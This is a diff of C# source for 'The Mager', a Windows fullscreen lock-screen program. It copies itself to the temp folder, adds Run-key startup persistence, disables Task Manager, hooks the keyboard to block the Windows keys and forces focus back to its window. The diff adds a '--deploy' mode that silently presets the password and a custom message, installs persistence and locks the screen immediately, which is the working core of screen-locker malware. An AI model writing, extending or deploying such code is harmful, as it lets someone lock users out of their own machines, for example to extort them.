@@ -18,38 +18,65 @@ namespace TheMager
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
 
-            // Auto-install: copy to temp and add to startup on first run
-            AutoInstall();
-
-            string configPath = Path.Combine(Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName), "lock_config.json");
+            string exeDir = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule.FileName);
+            string configPath = Path.Combine(exeDir, "lock_config.json");
             string passwordFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "themager_pw.dat");
 
             // Parse args
-            foreach (string arg in args)
+            bool doChange = false;
+            bool doUninstall = false;
+            bool doDeploy = false;
+            string deployPw = null;
+            string deployMsg = null;
+
+            for (int i = 0; i < args.Length; i++)
             {
-                if (arg == "--change")
-                {
-                    ChangePassword(passwordFile);
-                    return;
-                }
-                if (arg == "--uninstall")
-                {
-                    Uninstall();
-                    return;
-                }
+                if (args[i] == "--change") doChange = true;
+                else if (args[i] == "--uninstall") doUninstall = true;
+                else if (args[i] == "--deploy") doDeploy = true;
+                else if (args[i] == "--password" && i + 1 < args.Length) deployPw = args[++i];
+                else if (args[i] == "--message" && i + 1 < args.Length) deployMsg = args[++i];
             }
+
+            if (doUninstall) { Uninstall(); return; }
+            if (doChange) { ChangePassword(passwordFile); return; }
+
+            // --deploy mode: pre-set password and message silently, then lock
+            if (doDeploy && deployPw != null)
+            {
+                // Save password hash
+                File.WriteAllText(passwordFile, Sha256(deployPw));
+                // Save message
+                if (deployMsg != null)
+                {
+                    try
+                    {
+                        string json = "{\"message\":\"" + deployMsg.Replace("\"", "\\\"") + "\"}";
+                        File.WriteAllText(configPath, json);
+                    }
+                    catch { }
+                }
+                // Auto-install to startup
+                AutoInstall();
+                // Lock immediately
+                LockScreen lockScreen = new LockScreen(passwordFile, configPath);
+                Application.Run(lockScreen);
+                return;
+            }
+
+            // Auto-install on normal run too
+            AutoInstall();
 
             // Check if password is set
             if (!File.Exists(passwordFile))
             {
-                // First run - show setup dialog
                 SetupAndLock(passwordFile, configPath);
                 return;
             }
 
             // Password exists - lock immediately
-            LockScreen lockScreen = new LockScreen(passwordFile, configPath);
-            Application.Run(lockScreen);
+            LockScreen ls = new LockScreen(passwordFile, configPath);
+            Application.Run(ls);
         }
 
         static void AutoInstall()
@@ -60,14 +87,12 @@ namespace TheMager
                 string tempDir = Path.Combine(Path.GetTempPath(), "TheMager");
                 string tempExe = Path.Combine(tempDir, "TheMager.exe");
 
-                // If we're already running from temp, just ensure registry entry exists
                 if (string.Equals(exePath, tempExe, StringComparison.OrdinalIgnoreCase))
                 {
                     EnsureStartupEntry(tempExe);
                     return;
                 }
 
-                // Copy ourselves to temp if not there or outdated
                 bool needCopy = true;
                 if (File.Exists(tempExe))
                 {
@@ -80,35 +105,30 @@ namespace TheMager
                 if (needCopy)
                 {
                     Directory.CreateDirectory(tempDir);
-                    // Try copy, retry if locked
                     for (int i = 0; i < 3; i++)
                     {
-                        try
-                        {
-                            File.Copy(exePath, tempExe, true);
-                            break;
-                        }
-                        catch
-                        {
-                            Thread.Sleep(500);
-                        }
+                        try { File.Copy(exePath, tempExe, true); break; }
+                        catch { Thread.Sleep(500); }
                     }
                 }
 
-                // Add to startup registry
+                // Also copy config if it exists nearby
+                string srcConfig = Path.Combine(Path.GetDirectoryName(exePath), "lock_config.json");
+                string dstConfig = Path.Combine(tempDir, "lock_config.json");
+                if (File.Exists(srcConfig) && !File.Exists(dstConfig))
+                {
+                    try { File.Copy(srcConfig, dstConfig, false); } catch { }
+                }
+
                 EnsureStartupEntry(tempExe);
             }
-            catch
-            {
-                // Silently fail - don't block locking if install fails
-            }
+            catch { }
         }
 
         static void EnsureStartupEntry(string exePath)
         {
             try
             {
-                // Try HKLM first (needs admin), fall back to HKCU
                 try
                 {
                     RegistryKey key = Registry.LocalMachine.OpenSubKey(
@@ -118,24 +138,19 @@ namespace TheMager
                 }
                 catch
                 {
-                    // Not admin - use HKCU (current user only)
                     RegistryKey key = Registry.CurrentUser.OpenSubKey(
                         @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                     key.SetValue("TheMager", "\"" + exePath + "\"");
                     key.Close();
                 }
             }
-            catch
-            {
-                // Registry write failed - non-critical
-            }
+            catch { }
         }
 
         static void Uninstall()
         {
             try
             {
-                // Remove from HKLM
                 try
                 {
                     RegistryKey key = Registry.LocalMachine.OpenSubKey(
@@ -145,7 +160,6 @@ namespace TheMager
                 }
                 catch { }
 
-                // Remove from HKCU
                 try
                 {
                     RegistryKey key = Registry.CurrentUser.OpenSubKey(
@@ -155,7 +169,6 @@ namespace TheMager
                 }
                 catch { }
 
-                // Remove from temp
                 string tempDir = Path.Combine(Path.GetTempPath(), "TheMager");
                 if (Directory.Exists(tempDir))
                     Directory.Delete(tempDir, true);
@@ -248,7 +261,6 @@ namespace TheMager
             };
             setup.Controls.Add(msgLabel);
 
-            // Custom message option
             var msgGroup = new Label
             {
                 Text = "Lock screen message (optional):",
@@ -291,11 +303,9 @@ namespace TheMager
                     return;
                 }
 
-                // Save password hash
                 string hash = Sha256(pwBox.Text);
                 File.WriteAllText(passwordFile, hash);
 
-                // Save custom message
                 try
                 {
                     string json = "{\"message\":\"" + customMsg.Text.Replace("\"", "\\\"") + "\"}";
@@ -391,7 +401,6 @@ namespace TheMager
         int failedAttempts = 0;
         string lockMessage = "This device is protected by The Mager";
 
-        // Low-level keyboard hook
         delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
@@ -407,7 +416,6 @@ namespace TheMager
         IntPtr hookId = IntPtr.Zero;
         LowLevelKeyboardProc hookProc;
 
-        // Focus enforcement timer
         System.Windows.Forms.Timer focusTimer;
 
         public LockScreen(string pwFile, string cfgPath)
@@ -415,7 +423,6 @@ namespace TheMager
             passwordFile = pwFile;
             configPath = cfgPath;
 
-            // Load custom message
             try
             {
                 if (File.Exists(cfgPath))
@@ -433,7 +440,6 @@ namespace TheMager
             }
             catch { }
 
-            // Disable Task Manager
             try
             {
                 RegistryKey key = Registry.CurrentUser.CreateSubKey(
@@ -443,7 +449,6 @@ namespace TheMager
             }
             catch { }
 
-            // Set up form - fullscreen black overlay
             this.FormBorderStyle = FormBorderStyle.None;
             this.WindowState = FormWindowState.Maximized;
             this.TopMost = true;
@@ -451,7 +456,6 @@ namespace TheMager
             this.ShowInTaskbar = false;
             this.Cursor = Cursors.Arrow;
 
-            // Title
             var title = new Label
             {
                 Text = "THE MAGER",
@@ -462,7 +466,6 @@ namespace TheMager
             title.Location = new System.Drawing.Point((Screen.PrimaryScreen.WorkingArea.Width - title.PreferredWidth) / 2, 150);
             this.Controls.Add(title);
 
-            // Lock message
             var msg = new Label
             {
                 Text = lockMessage,
@@ -473,7 +476,6 @@ namespace TheMager
             msg.Location = new System.Drawing.Point((Screen.PrimaryScreen.WorkingArea.Width - msg.PreferredWidth) / 2, 230);
             this.Controls.Add(msg);
 
-            // Password box
             var pwBox = new TextBox
             {
                 UseSystemPasswordChar = true,
@@ -486,7 +488,6 @@ namespace TheMager
             pwBox.Location = new System.Drawing.Point((Screen.PrimaryScreen.WorkingArea.Width - 300) / 2, 320);
             this.Controls.Add(pwBox);
 
-            // Unlock button
             var unlockBtn = new Button
             {
                 Text = "UNLOCK",
@@ -498,7 +499,6 @@ namespace TheMager
             unlockBtn.Location = new System.Drawing.Point((Screen.PrimaryScreen.WorkingArea.Width - 300) / 2, 365);
             this.Controls.Add(unlockBtn);
 
-            // Failed attempts label
             var failLabel = new Label
             {
                 ForeColor = System.Drawing.Color.Red,
@@ -508,7 +508,6 @@ namespace TheMager
             failLabel.Location = new System.Drawing.Point((Screen.PrimaryScreen.WorkingArea.Width - 200) / 2, 420);
             this.Controls.Add(failLabel);
 
-            // Unlock logic
             EventHandler tryUnlock = delegate
             {
                 if (pwBox.Text.Length == 0) return;
@@ -532,13 +531,11 @@ namespace TheMager
                 if (e.KeyCode == Keys.Enter) tryUnlock(null, null);
             };
 
-            // Install keyboard hook
             hookProc = HookCallback;
             using (Process curProc = Process.GetCurrentProcess())
             using (ProcessModule curModule = curProc.MainModule)
                 hookId = SetWindowsHookEx(13, hookProc, GetModuleHandle(curModule.ModuleName), 0);
 
-            // Focus enforcement
             focusTimer = new System.Windows.Forms.Timer();
             focusTimer.Interval = 200;
             focusTimer.Tick += delegate
@@ -557,7 +554,6 @@ namespace TheMager
 
         void Unlock()
         {
-            // Re-enable Task Manager
             try
             {
                 RegistryKey key = Registry.CurrentUser.CreateSubKey(
@@ -567,11 +563,9 @@ namespace TheMager
             }
             catch { }
 
-            // Remove hook
             if (hookId != IntPtr.Zero) UnhookWindowsHookEx(hookId);
             focusTimer.Stop();
 
-            // Allow close and exit
             this.FormClosing -= null;
             this.FormClosing += delegate(object sender, FormClosingEventArgs e) { };
             this.Close();
@@ -583,8 +577,7 @@ namespace TheMager
             if (nCode >= 0)
             {
                 int vkCode = Marshal.ReadInt32(lParam);
-                // Block: Win key (91,92), Alt+Tab, Ctrl+Esc, Alt+F4
-                if (vkCode == 91 || vkCode == 92) // Win keys
+                if (vkCode == 91 || vkCode == 92)
                     return (IntPtr)1;
             }
             return CallNextHookEx(hookId, nCode, wParam, lParam);
